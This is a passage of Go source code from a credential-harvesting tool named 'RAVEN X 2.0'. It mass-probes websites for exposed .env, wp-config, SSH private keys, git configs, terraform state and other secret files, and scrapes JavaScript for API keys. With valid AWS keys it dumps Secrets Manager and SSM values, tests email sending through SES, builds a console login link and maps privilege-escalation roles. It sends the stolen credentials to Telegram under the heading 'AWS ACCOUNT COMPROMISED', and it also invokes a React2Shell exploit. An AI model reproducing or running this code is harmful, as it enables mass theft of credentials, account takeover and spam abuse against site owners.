			secret := aws.ToString(val.SecretString)
			if secret == "" && val.SecretBinary != nil {
				secret = fmt.Sprintf("[binary %d bytes]", len(val.SecretBinary))
			}
			a.saveIntoFile(fmt.Sprintf("%s:%s:%s:%s=%s", sanitizeSource(sourceURL), ak, region, name, secret), "aws_secrets.txt")
			pterm.Warning.Printfln("[SECRETS MANAGER] %s / %s", region, name)
		}
	}
}

// scanSSMParameters dumps all SSM Parameter Store values (with decryption) across every region.
func (a *AWSScanner) scanSSMParameters(baseCfg aws.Config, ak, sk, sourceURL string) {
	for _, region := range awsRegions {
		regionCfg := baseCfg.Copy()
		regionCfg.Region = region
		svc := ssm.NewFromConfig(regionCfg)

		ctx, cancel := context.WithTimeout(context.Background(), 20*time.Second)
		desc, err := svc.DescribeParameters(ctx, &ssm.DescribeParametersInput{})
		cancel()
		if err != nil || desc == nil {
			continue
		}

		for _, p := range desc.Parameters {
			name := aws.ToString(p.Name)
			ctx2, cancel2 := context.WithTimeout(context.Background(), 10*time.Second)
			withDecryption := true
			val, err := svc.GetParameter(ctx2, &ssm.GetParameterInput{
				Name:           p.Name,
				WithDecryption: &withDecryption,
			})
			cancel2()
			if err != nil || val == nil || val.Parameter == nil {
				continue
			}
			value := aws.ToString(val.Parameter.Value)
			a.saveIntoFile(fmt.Sprintf("%s:%s:%s:%s=%s", sanitizeSource(sourceURL), ak, region, name, value), "aws_ssm.txt")
			pterm.Warning.Printfln("[SSM] %s / %s", region, name)
		}
	}
}

func (a *AWSScanner) handleValidAWS(ak, sk, st, sourceURL string, identity *sts.GetCallerIdentityOutput, cfg aws.Config, s3Status string) {

	keyLine := fmt.Sprintf("%s:%s", ak, sk)
	if st != "" {
		keyLine = fmt.Sprintf("%s:%s:%s", ak, sk, st)
	}

	a.logValid("AWS", fmt.Sprintf("%s (S3: %s)", keyLine, s3Status))
	a.saveIntoFile(fmt.Sprintf("%s:%s:%s", sanitizeSource(sourceURL), keyLine, a.DefaultRegion), "aws_credentials.txt")
	a.saveIntoFile(fmt.Sprintf("%s:%s:%s", sanitizeSource(sourceURL), ak, sk), "aws_valid.txt")

	globalCounters.mu.Lock()
	globalCounters.AWSKeysValidated++
	globalCounters.mu.Unlock()

	// Pengecekan Quota AWS menggunakan AWSChecks
	sesInfo := a.checkSESDetailsAllRegions(cfg)
	snsInfo := a.checkSNSLimitAllRegions(cfg)
	fargateInfo := a.checkFargateOnDemandLimitAllRegions(cfg)
	fedInfo := a.getFederationConsoleURL(cfg, identity, 43200)

	// Secrets Manager + SSM Parameter Store — run in background so the
	// Telegram report fires immediately while exfil continues.
	go a.scanSecretsManager(cfg, ak, sk, sourceURL)
	go a.scanSSMParameters(cfg, ak, sk, sourceURL)

	// Coba kirim email via AWS SES
	emailResult := a.SendEmailViaAWS(cfg, ak, sk, sourceURL)

	arnParts := strings.Split(*identity.Arn, ":")
	userOrRole := arnParts[len(arnParts)-1]
	iamAuditResult := "Skipped (Not User)"
	if strings.Contains(*identity.Arn, ":user/") {
		iamAuditResult = a.auditIAMUser(cfg, userOrRole)
	}
	// Enumerate assumeable roles — identifies privilege escalation paths
	// that direct policy inspection misses (e.g. a limited key that can
	// assume OrganizationAccountAccessRole → AdministratorAccess).
	go a.auditAssumeableRoles(cfg, ak, sourceURL)

	// Enhanced report format matching main.py style
	reportLines := []string{}
	reportLines = append(reportLines, "🔒  AWS SES Status 🔒")
	reportLines = append(reportLines, "")
	reportLines = append(reportLines, fmt.Sprintf("🔑 Access Key: %s", ak))
	reportLines = append(reportLines, fmt.Sprintf("🔒 Secret Key: %s", sk))
	if st != "" {
		reportLines = append(reportLines, fmt.Sprintf("🎫 Session Token: %s...", st[:20]))
	}
	reportLines = append(reportLines, "")
	reportLines = append(reportLines, fmt.Sprintf("🌐 Region: %s", a.DefaultRegion))
	reportLines = append(reportLines, "")

	var sesDetails string
	maxQuota := 0.0
	sentLast24 := 0.0
	allIdentities := []string{}

	if len(sesInfo) > 0 {
		reportLines = append(reportLines, "✅  Account Information (SESv2)")
		for r, d := range sesInfo {
			quota, ok := d["SendQuota"].(float64)
			if ok && quota > maxQuota {
				maxQuota = quota
			}
			lastSent, _ := d["LastSend"].(float64)
			if lastSent > sentLast24 {
				sentLast24 = lastSent
			}
			health, _ := d["HealthStatus"].(string)
			identities, _ := d["Identities"].([]string)
			if identities != nil {
				allIdentities = append(allIdentities, identities...)
			}
			sesDetails += fmt.Sprintf("  • %s: %.0f/24h (Health: %v)\n", r, quota, health)
		}
		reportLines = append(reportLines, fmt.Sprintf("    📤 Sending Enabled: ✅ YES"))
		reportLines = append(reportLines, fmt.Sprintf("    🏭 Production Access: ✅ YES"))
		reportLines = append(reportLines, fmt.Sprintf("    📊 Max 24h Send: %.0f emails", maxQuota))
		reportLines = append(reportLines, fmt.Sprintf("    ✉️ Sent Last 24h: %.0f emails", sentLast24))
		reportLines = append(reportLines, fmt.Sprintf("    📬 Remaining: %.0f emails", maxQuota-sentLast24))
		reportLines = append(reportLines, "")
	} else {
		sesDetails = "  • No Active SES Found"
		reportLines = append(reportLines, "⚠️ SES Access Denied or Service Not Active in this Region")
		reportLines = append(reportLines, "")
	}

	// Email sending status
	reportLines = append(reportLines, "📧  Email Sending Test")
	if emailResult["success"].(bool) {
		reportLines = append(reportLines, "    ✅ Status: Email Sent Successfully")
		reportLines = append(reportLines, fmt.Sprintf("    📮 From: %s", emailResult["from_email"]))
		reportLines = append(reportLines, fmt.Sprintf("    🌐 Region: %s", emailResult["region"]))
		if quotaLimit, ok := emailResult["quota_limit"].(float64); ok {
			reportLines = append(reportLines, fmt.Sprintf("    📊 Quota Limit: %.0f emails/24h", quotaLimit))
		}
		if quotaRemaining, ok := emailResult["quota_remaining"].(float64); ok {
			reportLines = append(reportLines, fmt.Sprintf("    📬 Remaining: %.0f emails", quotaRemaining))
		}
		if identities, ok := emailResult["identities"].([]string); ok && len(identities) > 0 {
			reportLines = append(reportLines, fmt.Sprintf("    📧 Identities: %s", strings.Join(identities, ", ")))
		}
	} else {
		reportLines = append(reportLines, "    ❌ Status: Failed to Send Email")
		if errMsg, ok := emailResult["error"].(string); ok {
			reportLines = append(reportLines, fmt.Sprintf("    ⚠️ Error: %s", errMsg))
		}
	}
	reportLines = append(reportLines, "")

	a.storeValidKeyLimit("AWS", ak, fmt.Sprintf("%.0f SES Limit / S3 Status: %s", maxQuota, s3Status))

	consoleLink := "N/A"
	if fedInfo != nil {
		consoleLink = fmt.Sprintf("<a href='%s'>LOGIN CONSOLE</a>", fedInfo["federation_console_url"])
	}

	// Format report similar to main.py
	reportMsg := strings.Join(reportLines, "\n")

	emailStatus := "❌ Failed"
	if emailResult["success"].(bool) {
		emailStatus = fmt.Sprintf("✅ Success (From: %s, Region: %s)", emailResult["from_email"], emailResult["region"])
	}

	msg := fmt.Sprintf(`🔥 <b>RAVEN X 2.0 RESULT</b>
━━━━━━━━━━━━━━━━━━
☁️ <b>AWS ACCOUNT COMPROMISED</b>

👤 <b>User/Role:</b> <code>%s</code>
🆔 <b>Account:</b> <code>%s</code>
🔑 <b>Credentials:</b> <code>%s</code>
🔗 <b>Console:</b> %s
📦 <b>S3 Status:</b> %s
🛡️ <b>IAM Audit:</b> %s
📧 <b>Email Test:</b> %s

<pre>%s</pre>

<b>Quota & Limits (SES):</b>
%s
`, userOrRole, *identity.Account, keyLine, consoleLink, s3Status, iamAuditResult, emailStatus, reportMsg, sesDetails)

	a.saveIntoFile(fmt.Sprintf("AWS %s SES: %+v SNS: %+v Fargate: %+v IAM Audit: %s", keyLine, sesInfo, snsInfo, fargateInfo, iamAuditResult), "aws_deep_scan.txt")

	// Hanya kirim telegram jika:
	// 1. Ada limit SES/SNS/Fargate yang terdeteksi DAN
	// 2. Bisa mengirim email via SDK
	hasLimits := len(sesInfo) > 0 || len(snsInfo) > 0 || len(fargateInfo) > 0
	emailSuccess := emailResult["success"].(bool)

	if hasLimits && emailSuccess {
		go a.sendTelegram(msg)
		pterm.Success.Printfln("[AWS NOTIF] Telegram sent for %s (Has Limits + Email Success)", ak[:8]+"...")
	} else {
		pterm.Warning.Printfln("[AWS SKIP] No Telegram for %s | Limits: %v | Email: %v", ak[:8]+"...", hasLimits, emailSuccess)
	}
}

func (a *AWSScanner) createRequest(domain string) {
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(requestTimeoutSeconds)*time.Second)
	defer cancel()

	proto := "http"
	if strings.Contains(domain, "://") {
		parts := strings.SplitN(domain, "://", 2)
		proto, domain = parts[0], parts[1]
	}
	domain = strings.TrimRight(domain, "/")

	// Separate the base hostname from any path component so that path probing
	// always targets the root domain (e.g. /.env on example.com, not on
	// example.com/pages/impressum/.env when the list contains full page URLs).
	baseDomain := domain
	if idx := strings.IndexByte(domain, '/'); idx >= 0 {
		baseDomain = domain[:idx]
	}

	protocols := []string{proto}
	if proto == "http" {
		protocols = append(protocols, "https")
	}

	for _, p := range protocols {
		// mainURL is the full input URL (used for jsExtended HTML body scan).
		// baseURL is the root of the domain (used for path probing).
		mainURL := fmt.Sprintf("%s://%s", p, domain)
		baseURL := fmt.Sprintf("%s://%s", p, baseDomain)
		_ = baseURL // used below in path probe loop

		// Check jika URL ini sudah pernah di-scan
		if _, loaded := a.VisitedURLs.LoadOrStore(mainURL, true); loaded {
			pterm.Debug.Printfln("[SKIP] URL already scanned: %s", mainURL)
			continue
		}

		req, errReq := http.NewRequestWithContext(ctx, "GET", mainURL, nil)
		if errReq != nil {
			pterm.Debug.Printfln("[REQUEST CREATE ERROR] Failed to create request for %s: %v", mainURL, errReq)
			continue
		}

		req.Header.Set("User-Agent", nextUA())

		resp, err := client.Do(req)

		if err != nil {
			if ctx.Err() == context.DeadlineExceeded {
				pterm.Debug.Printfln("[TIMEOUT] Request to %s timed out after %ds.", mainURL, requestTimeoutSeconds)
			} else {
				pterm.Debug.Printfln("[HTTP ERROR] %s: %v", mainURL, err)
			}
			continue
		}

		// 128KB is enough to capture any .env / config file with credentials.
		// Keeping this small is the single biggest RAM saving — 80 goroutines
		// × 128KB = 10MB peak vs 80 × 512KB = 40MB at the old limit.
		body, _ := io.ReadAll(io.LimitReader(resp.Body, 128*1024))
		resp.Body.Close()

		// Track valid/invalid host counts for stats.json progression metrics.
		if resp.StatusCode == 200 {
			globalCounters.mu.Lock()
			globalCounters.ValidHosts++
			globalCounters.mu.Unlock()
		} else {
			globalCounters.mu.Lock()
			globalCounters.InvalidHosts++
			globalCounters.mu.Unlock()
		}

		var wg sync.WaitGroup

		wg.Add(1)
		go func() {
			defer wg.Done()
			// JS Extended — scan the raw page HTML body for inline credentials.
			// Runs on the actual URL from the list (mainURL), not path-appended variants.
			// This catches API keys hardcoded in <script> blocks, data attributes, etc.
			if a.Config.ScanningFeatures.JSExtendedScan {
				a.checkAndSaveKeys(string(body), mainURL)
			}
			// JS Scanner — only runs when enabled
			if a.Config.ScanningFeatures.JSScan {
				// Scoped to <script src=...> only (case-insensitive); dot before js is
				// escaped so it cannot match a stray character (e.g. "ajs", "bjs").
				jsRegex := regexp.MustCompile(`(?i)<script[^>]+src=["']([^"']+\.js[^"']*)["']`)
				jsFiles := jsRegex.FindAllStringSubmatch(string(body), -1)
				for _, js := range jsFiles {
					if len(js) > 1 {
						fullJS := resolveURL(mainURL, js[1])
						if !a.BlacklistPattern.MatchString(fullJS) {
							if r, e := client.Get(fullJS); e == nil {
								b, _ := io.ReadAll(io.LimitReader(r.Body, 128*1024))
								r.Body.Close()
								a.checkAndSaveKeys(string(b), fullJS)
								go a.checkJSSAST(string(b), fullJS)
								// Second-level: extract and scan JS files referenced within this JS file
								if a.Config.ScanningFeatures.JSScan {
									subMatches := jsRegex.FindAllStringSubmatch(string(b), -1)
									var subSrcs []string
									for _, sm := range subMatches {
										if len(sm) > 1 {
											subSrcs = append(subSrcs, resolveURL(fullJS, sm[1]))
										}
									}
									subSrcs = unique(subSrcs)
									// Limit to 10 sub-JS files per parent to avoid explosion
									if len(subSrcs) > 10 {
										subSrcs = subSrcs[:10]
									}
									for _, subSrc := range subSrcs {
										if subSrc == fullJS || strings.HasSuffix(subSrc, ".css") {
											continue
										}
										subReq, subErr := http.NewRequest("GET", subSrc, nil)
										if subErr != nil {
											continue
										}
										subReq.Header.Set("User-Agent", nextUA())
										subCtx, subCancel := context.WithTimeout(context.Background(), 10*time.Second)
										subResp, subErr := client.Do(subReq.WithContext(subCtx))
										subCancel()
										if subErr != nil || subResp.StatusCode != 200 {
											if subResp != nil {
												subResp.Body.Close()
											}
											continue
										}
										subBody, _ := io.ReadAll(io.LimitReader(subResp.Body, 128*1024))
										subResp.Body.Close()
										if len(subBody) > 0 {
											a.checkAndSaveKeys(string(subBody), subSrc)
										}
									}
								}
							}
							// Probe source map — contains original pre-bundled source which
							// often retains API keys stripped from the minified bundle.
							mapURL := fullJS + ".map"
							if r2, e2 := client.Get(mapURL); e2 == nil {
								b2, _ := io.ReadAll(io.LimitReader(r2.Body, 128*1024))
								r2.Body.Close()
								if len(b2) > 0 {
									a.checkAndSaveKeys(string(b2), mapURL)
								}
							}
						}
					}
				}
			} // end JSScan
		}()

		// Run exploit functions untuk setiap URL
		// Sequential execution untuk menghindari ledakan goroutine
		if a.Config.ExploitMethods.React2Shell {
			a.ExploitReact2Shell(mainURL, mainURL)
		}

		// ── Path Scanner (always on) — the core .env list + AWS creds ──
		commonPaths := append([]string(nil), a.EnvPaths...)
		commonPaths = append(commonPaths, "/.aws/credentials", "/.aws/config")

		// PHP / WP Scanner
		if a.Config.ScanningFeatures.PHPInfoScan {
			commonPaths = append(commonPaths, a.PHPInfoPaths...)
			commonPaths = append(commonPaths,
				"/wp-config.php", "/wp-config.php.bak", "/wp-config.php.old",
				"/wp-config.php.orig", "/wp-config.php~", "/wp-config.bak",
				"/../wp-config.php", "/wordpress/wp-config.php", "/blog/wp-config.php",
				"/cms/wp-config.php",
				"/config.php", "/config/config.php", "/configuration.php",
				"/config/database.php", "/database.php", "/db.php",
				"/includes/config.php", "/include/config.php", "/inc/config.php",
				"/app/config/database.php", "/application/config/database.php",
				"/config/app.php", "/config/mail.php", "/config/services.php",
				"/application/config/config.php", "/application/config/email.php",
				// Laravel log — stack traces frequently contain DB credentials / API keys
				"/storage/logs/laravel.log",
				"/storage/logs/laravel-today.log",
				// WordPress additional
				"/wp-content/debug.log",
				"/wp-includes/version.php",
				// Symfony profiler
				"/_profiler",
				"/_profiler/latest",
			)
		}

		// Git Scanner
		if a.Config.ScanningFeatures.GitConfigScan {
			commonPaths = append(commonPaths,
				"/.git/config", "/.git/HEAD", "/.git/FETCH_HEAD",
				"/.git/packed-refs", "/.gitconfig",
			)
		}

		// Docker Scanner
		if a.Config.ScanningFeatures.DockerScan {
			commonPaths = append(commonPaths,
				"/docker-compose.yml", "/docker-compose.yaml",
				"/docker-compose.override.yml", "/docker-compose.prod.yml",
				"/Dockerfile", "/.docker/config.json", "/compose.yml",
			)
		}

		// Config File Scanner — Spring/Django/Rails/.NET/Node
		if a.Config.ScanningFeatures.ConfigFileScan {
			commonPaths = append(commonPaths,
				"/application.properties", "/src/main/resources/application.properties",
				"/application.yml", "/application.yaml", "/bootstrap.properties", "/bootstrap.yml",
				"/settings.py", "/config/settings.py", "/app/settings.py", "/core/settings.py",
				"/settings/base.py", "/settings/production.py", "/settings/local.py", "/local_settings.py",
				"/appsettings.json", "/appsettings.Production.json", "/appsettings.Development.json",
				"/Web.config", "/web.config",
				"/config/database.yml", "/config/secrets.yml", "/config/master.key",
				"/.npmrc", "/.yarnrc", "/package.json", "/.pypirc", "/pip.conf",
				"/Procfile", "/app.yaml", "/app.json",
				"/credentials.json", "/credentials.yml", "/secrets.json", "/secrets.yml",
				"/.htpasswd", "/nginx.conf",
				"/dump.sql", "/backup.sql", "/db.sql", "/database.sql",
				// Spring Boot actuator — /actuator/env exposes ALL env vars including API keys
				"/actuator/env", "/actuator/configprops", "/actuator/mappings",
				"/actuator/health", "/actuator/info",
				// Metrics endpoint — sometimes leaks config labels
				"/metrics",
				// Ruby on Rails secret/session initializers
				"/config/initializers/secret_token.rb",
				"/config/initializers/session_store.rb",
				// Python / Django
				"/requirements.txt",
				"/manage.py",
				// Node.js source sometimes directly accessible
				"/server.js", "/app.js", "/index.js",
				// Kubernetes / Helm secrets
				"/values.yaml", "/k8s/secrets.yaml", "/kubernetes/secrets.yaml",
				// Serverless / CloudFormation
				"/serverless.yml", "/serverless.yaml",
				"/sam-template.yml", "/sam-template.yaml",
				"/cloudformation.yml", "/cloudformation.yaml",
			)
		}

		// Backup File Scanner — .bak / .old / .orig copies
		if a.Config.ScanningFeatures.BackupFileScan {
			commonPaths = append(commonPaths,
				"/.env.bak", "/.env.old", "/.env.backup", "/.env.orig", "/.env~", "/.env.save",
				"/.env.example", "/.env.sample",
				"/config.bak", "/config.old", "/database.yaml",
				"/.secret", "/private.key", "/id_rsa",
				"/wp-login.php",
				"/wp-admin/",
				"/administrator/index.php",
				"/admin/login.php",
				"/cpanel/",
				"/.ssh/id_rsa", "/.ssh/authorized_keys",
				"/.ssh/id_ed25519", "/.ssh/id_ecdsa", "/.ssh/id_dsa",
				"/.ssh/config", "/id_ed25519", "/server.key",
				"/home/ubuntu/.ssh/id_rsa", "/root/.ssh/id_rsa",
				"/setup.cfg",
				// CI/CD pipeline configs — often contain embedded secrets or env var names
				"/.travis.yml",
				"/.circleci/config.yml",
				"/Jenkinsfile",
				"/bitbucket-pipelines.yml",
				"/.gitlab-ci.yml",
				"/.github/workflows/deploy.yml",
				"/.github/workflows/ci.yml",
				"/.github/workflows/release.yml",
				// Swagger / OpenAPI docs — reveal API structure and sometimes example keys
				"/swagger.json",
				"/swagger/v1/swagger.json",
				"/api-docs",
				"/api/v1/docs",
				"/openapi.json",
				"/openapi.yaml",
				"/v1/swagger.json",
				"/v2/swagger.json",
				"/v3/swagger.json",
				// Go expvar / debug endpoints
				"/debug/vars",
				"/debug/pprof/",
				// macOS Finder metadata — binary file listing server directory tree
				"/.DS_Store",
				"/public/.DS_Store",
				"/static/.DS_Store",
				"/assets/.DS_Store",
				// Terraform state — plaintext credentials for every provisioned resource
				"/terraform.tfstate",
				"/terraform.tfstate.backup",
				"/.terraform/terraform.tfstate",
				"/infra/terraform.tfstate",
				"/infrastructure/terraform.tfstate",
				"/deploy/terraform.tfstate",
				"/tf/terraform.tfstate",
			)
		}

		// NVCA Scanner — Node/Vue/Next.js/Nuxt config API endpoints
		if a.Config.ScanningFeatures.NVCAScan {
			commonPaths = append(commonPaths,
				"/.nuxt/",
				"/.next/server/app-paths-manifest.json",
				"/.next/routes-manifest.json",
				"/.next/build-manifest.json",
				"/nuxt.config.js",
				"/_nuxt/builds/latest/meta.json",
				"/config/default.json",
				"/config/production.json",
				"/config/local.json",
				"/config/app.json",
				"/src/environments/environment.prod.js",
				"/src/environments/environment.ts",
				"/src/config.ts",
				"/src/config.js",
				"/app/config.js",
				"/assets/config.json",
				"/static/config.json",
				"/public/config.json",
			)
		}

		// GPL Scanner — GraphQL introspection and endpoint probing
		// TODO: add a POST introspection probe ({"query":"{__schema{types{name}}}"})
		// for endpoints that do not respond to GET with schema data.
		if a.Config.ScanningFeatures.GPLScan {
			commonPaths = append(commonPaths,
				"/graphql",
				"/api/graphql",
				"/v1/graphql",
				"/v2/graphql",
				"/query",
				"/gql",
				"/graphiql",
				"/playground",
			)
		}

		// LIB Scanner — package manifests and .npmrc auth tokens
		if a.Config.ScanningFeatures.LibScan {
			commonPaths = append(commonPaths,
				"/package.json",
				"/package-lock.json",
				"/yarn.lock",
				"/.npmrc",
				"/.yarnrc",
				"/.yarnrc.yml",
				"/composer.json",
				"/composer.lock",
				"/Gemfile",
				"/Gemfile.lock",
				"/requirements.txt",
				"/Pipfile",
				"/Pipfile.lock",
				"/pyproject.toml",
				"/.env.example",
				"/.env.sample",
				"/go.mod", // may expose internal module paths
			)
		}

		// All gated groups have already been appended above — nothing more to add.

		// Deduplicate before scanning: PHPInfoPaths and loadEnvPaths() share several
		// entries (/config.php, /database.php, etc.) which would otherwise fire twice.
		commonPaths = unique(commonPaths)

		// Batasi goroutine untuk path scanning
		sem := make(chan struct{}, 100)
		for _, path := range commonPaths {
			wg.Add(1)
			go func(pth string) {
				defer wg.Done()
				sem <- struct{}{}
				defer func() { <-sem }()

				fullURL := fmt.Sprintf("%s://%s%s", p, baseDomain, pth)
				if r, e := client.Get(fullURL); e == nil {
					b, _ := io.ReadAll(io.LimitReader(r.Body, 128*1024))
					r.Body.Close()
					if len(b) > 0 {
						if strings.Contains(pth, ".git/config") || strings.Contains(pth, ".gitconfig") {
							a.extractGitCredentials(string(b), fullURL)
						} else {
							a.checkAndSaveKeys(string(b), fullURL)
						}
						// GPL: POST GraphQL introspection if this looks like a GraphQL endpoint
						if a.Config.ScanningFeatures.GPLScan {
							pthLower := strings.ToLower(pth)
							if strings.Contains(pthLower, "graphql") || strings.Contains(pthLower, "/gql") || pth == "/query" {
								go a.probeGraphQLIntrospection(fullURL)
							}
						}
						// LIB CVE: query OSV for known vulnerable package versions
						if a.Config.ScanningFeatures.LibScan {
							pthLower := strings.ToLower(pth)
							if isPackageManifest(pthLower) {
								go a.checkPackageManifestCVEs(string(b), fullURL, pthLower)
							}
						}
						// npm supply chain: typosquat + license + registry age/R2S
						if a.Config.ScanningFeatures.LibScan {
							pthLower := strings.ToLower(pth)
							go a.checkNPMSupplyChain(string(b), fullURL, pthLower)
						}
					}
				}
			}(path)
		}

		wg.Wait()
		return
	}
}

func (a *AWSScanner) DisplaySummary() {
	pterm.DefaultSection.Println("HASIL SCANNING - RAVEN X 2.0")

	apiSuccessRate := 0.0
	if globalCounters.APIsFoundTotal > 0 {
		apiSuccessRate = float64(globalCounters.APIsValidated) / float64(globalCounters.APIsFoundTotal) * 100
	}

	data := [][]string{
		{"Metric", "Count", "Status"},
		{"URLs Loaded", pterm.Cyan(globalCounters.URLsLoaded), ""},
		{"☁️ Valid AWS Keys", pterm.FgLightCyan.Sprint(globalCounters.AWSKeysValidated), "Deep Audit Success"},
		{"Total API Keys Found", pterm.Magenta(globalCounters.APIsFoundTotal), ""},
		{"API Keys Validated (Mail/SMS/Payment/AI/GCP)", pterm.Green(globalCounters.APIsValidated), pterm.Bold.Sprintf("(%.2f%% Success)", apiSuccessRate)},
		{"Valid SMTP Servers", pterm.FgLightGreen.Sprint(globalCounters.ValidSMTP), ""},
		{"Peak RPS (requests/sec)", fmt.Sprintf("%.1f", globalCounters.RequestsPerSec), ""},
		{"Peak PPS (parses/sec)", fmt.Sprintf("%.1f", globalCounters.ParsesPerSec), ""},
	}
	pterm.DefaultTable.WithHasHeader().WithData(data).Render()

	pterm.Println()

	pterm.FgGreen.Println("# ✅ Valid Keys & Control Limits")

	limitData := [][]string{{"Type", "Key (Masked)", "Limit/Quota"}}

	a.ValidKeyLimits.Range(func(key, value interface{}) bool {
		keyStr := key.(string)
		limitStr := value.(string)
		parts := strings.Split(keyStr, ":")
		if len(parts) >= 2 {
			keyType := parts[0]
			keyVal := parts[1]
			limitData = append(limitData, []string{pterm.NewStyle(pterm.Bold).Sprint(keyType), pterm.Cyan(keyVal), pterm.Green(limitStr)})
		}
		return true
	})

	if len(limitData) > 1 {
		pterm.DefaultTable.WithHasHeader().WithData(limitData).Render()
	} else {
		pterm.Info.Println("No API keys with observable limits were validated and stored.")
	}

	pterm.FgGreen.Println("\n======== ALL PROCESSES COMPLETED! ========")
}

func renderBanner() {
	pterm.DefaultBigText.WithLetters(
		pterm.NewLettersFromStringWithStyle("RAVEN", pterm.NewStyle(pterm.FgCyan)),
		pterm.NewLettersFromStringWithStyle("X 2.0", pterm.NewStyle(pterm.FgLightMagenta)),
	).Render()
	pterm.DefaultCenter.Println(pterm.LightWhite("Advanced AWS & Secret Scanner CLI"))
	pterm.DefaultCenter.Println(pterm.Gray("Based on original work by @JIMMYBOGARTZ | UI by Raven X Team"))
	pterm.Println()
}

func interactiveMode() string {
	renderBanner()
	targetFile, _ := pterm.DefaultInteractiveTextInput.Show("Enter list file path (URLs)")
	if targetFile == "" {
		pterm.Error.Println("File path cannot be empty.")
		os.Exit(1)
	}
	return targetFile
}

func (a *AWSScanner) processBatch(urls []string) {
	var wg sync.WaitGroup
	// 120 concurrent goroutines: 120 × 136KB ≈ 16MB peak buffer — safe on 1.92GB workers.
	// Dial timeout (3s) + TLS timeout (4s) ensure dead IPs free goroutines well before
	// the 5s request timeout, keeping the slot busy only while data is actually flowing.
	sem := make(chan struct{}, 120)

	for _, u := range urls {
		wg.Add(1)
		sem <- struct{}{}
		go func(url string) {
			defer wg.Done()
			defer func() { <-sem }()
			a.createRequest(url)
			if a.ProgressBar != nil {
				a.ProgressBar.Increment()
			}
			globalCounters.mu.Lock()
			globalCounters.URLsProcessed++
			processed := globalCounters.URLsProcessed
			failed := globalCounters.URLsFailed
			globalCounters.mu.Unlock()
			if processed%50 == 0 {
				statsData := fmt.Sprintf(`{"failed":%d,"processed":%d}`, failed, processed)
				_ = os.WriteFile(filepath.Join("ResultJS", "crack_stats.json"), []byte(statsData), 0644)
			}
		}(u)
	}
	wg.Wait()
}

// writeCheckpoint atomically writes the number of lines read so far to
// checkpointFile.  Used by the backend's redistribution logic to determine
// how much of a dead worker's slice has already been processed.
func writeCheckpoint(path string, linesRead int) {
	if path == "" {
		return
	}
	tmp := path + ".tmp"
	if err := os.WriteFile(tmp, []byte(strconv.Itoa(linesRead)), 0644); err == nil {
		_ = os.Rename(tmp, path) // atomic replace
	}
}

// logActiveAddons prints every enabled addon at startup so the operator can
// confirm the full detection suite is loaded before the scan begins.
func (a *AWSScanner) logActiveAddons() {
	c := a.Config
	type addonFlag struct {
		name    string
		enabled bool
	}
	addons := []addonFlag{
		// AWS
		{"AWS Main Scan (AKIA+ASIA)", c.ScanningFeatures.AWSMainScan},
		{"AWS SES Quota Check", c.AWSChecks.SESQuotaCheck},
		{"AWS SNS Limit", c.AWSChecks.SNSLimitCheck},
		{"AWS Fargate Limit", c.AWSChecks.FargateLimitCheck},
		// Email API
		{"SendGrid", c.APIValidation.SendGrid},
		{"Mailgun (legacy)", c.APIValidation.Mailgun},
		{"Mailgun (new)", c.Features.NewMailgun},
		{"Brevo / Sendinblue", c.Features.Brevo},
		{"Mandrill", c.Features.Mandrill},
		{"MailerSend", c.Features.MailerSend},
		{"Postmark", c.APIValidation.Postmark},
		{"SparkPost", c.APIValidation.SparkPost},
		{"Mailtrap", c.APIValidation.Mailtrap},
		{"Mailjet", c.APIValidation.Mailjet},
		{"XSMTP", c.Features.XSMTP},
		// Payment
		{"Stripe", c.APIValidation.Stripe},
		// AI
		{"OpenAI / AI-all", c.APIValidation.OpenAI || c.APIValidation.AIAll},
		{"Anthropic", c.APIValidation.Anthropic || c.APIValidation.AIAll},
		// SMS / Voice
		{"Twilio", c.APIValidation.Twilio},
		{"Nexmo / Vonage", c.APIValidation.Nexmo},
		{"Telnyx", c.APIValidation.Telnyx},
		{"MessageBird", c.APIValidation.MessageBird},
		{"Plivo", c.APIValidation.Plivo},
		// Cloud
		{"Tencent Cloud", c.APIValidation.Tencent},
		// SMTP crawl
		{"SMTP credentials scan", c.ScanningFeatures.SMTPCredentialsScan},
		// Scan method gates
		{"JS Scanner", c.ScanningFeatures.JSScan},
		{"JS Extended (inline HTML scan)", c.ScanningFeatures.JSExtendedScan},
		{"PHP / phpinfo Scanner", c.ScanningFeatures.PHPInfoScan},
		{"Git Config Scanner", c.ScanningFeatures.GitConfigScan},
		{"Docker Compose Scanner", c.ScanningFeatures.DockerScan},
		{"Config File Scanner", c.ScanningFeatures.ConfigFileScan},
		{"Backup File Scanner", c.ScanningFeatures.BackupFileScan},
		{"NVCA Scanner (Node/Vue/Next/Nuxt)", c.ScanningFeatures.NVCAScan},
		{"GPL Scanner (GraphQL)", c.ScanningFeatures.GPLScan},
		{"LIB Scanner (package manifests)", c.ScanningFeatures.LibScan},
		// Exploit methods
		{"React2Shell", c.ExploitMethods.React2Shell},
		{"LFI", c.ExploitMethods.LFI},
		{"SSRF", c.ExploitMethods.SSRF},
	}

	pterm.DefaultSection.Println("Active Addons")
	on, off := 0, 0
	for _, a := range addons {
		if a.enabled {
			pterm.Success.Printfln("  ✓  %s", a.name)
			on++
		} else {
			pterm.Warning.Printfln("  ✗  %s (disabled)", a.name)
			off++
		}
	}
	pterm.Info.Printfln("%d active, %d disabled", on, off)
}

// startRateTracker updates RequestsPerSec and ParsesPerSec every second and
// writes a stats.json to the ResultJS directory so Flask can expose the live
// metrics without any SSH log parsing.
func startRateTracker() {
	// Seed ValidHosts/InvalidHosts from the last stats.json written by a
	// previous run. This means counters survive a scanner restart — they
	// continue from the last saved value instead of resetting to 0.
	if data, err := os.ReadFile(filepath.Join("ResultJS", "stats.json")); err == nil {
		var prev map[string]interface{}
		if json.Unmarshal(data, &prev) == nil {
			globalCounters.mu.Lock()
			if v, ok := prev["valid_hosts"].(float64); ok && v >= 0 {
				globalCounters.ValidHosts = int(v)
			}
			if v, ok := prev["invalid_hosts"].(float64); ok && v >= 0 {
				globalCounters.InvalidHosts = int(v)
			}
			globalCounters.mu.Unlock()
		}
	}

	go func() {
		ticker := time.NewTicker(1 * time.Second)
		defer ticker.Stop()
		for range ticker.C {
			globalCounters.mu.Lock()
			newReq := globalCounters.URLsProcessed
			newParse := globalCounters.APIsFoundTotal
			globalCounters.RequestsPerSec = float64(newReq - globalCounters.requestSnapshot)
			globalCounters.ParsesPerSec = float64(newParse - globalCounters.parseSnapshot)
			globalCounters.requestSnapshot = newReq
			globalCounters.parseSnapshot = newParse
			globalCounters.rpsTotal += globalCounters.RequestsPerSec
			globalCounters.ppsTotal += globalCounters.ParsesPerSec
			globalCounters.rpsCount++
